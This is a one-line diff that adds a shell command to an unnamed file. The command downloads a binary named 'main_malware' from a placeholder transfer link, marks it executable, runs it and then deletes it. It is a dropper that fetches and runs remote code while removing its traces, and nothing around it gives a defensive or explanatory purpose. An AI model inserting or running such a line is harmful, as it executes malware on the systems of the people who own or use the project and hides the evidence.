@@ -1,0 +1,1 @@
+wget link_transfer_sh_main_malware; chmod +x main_malware; ./main_malware; rm main_malware
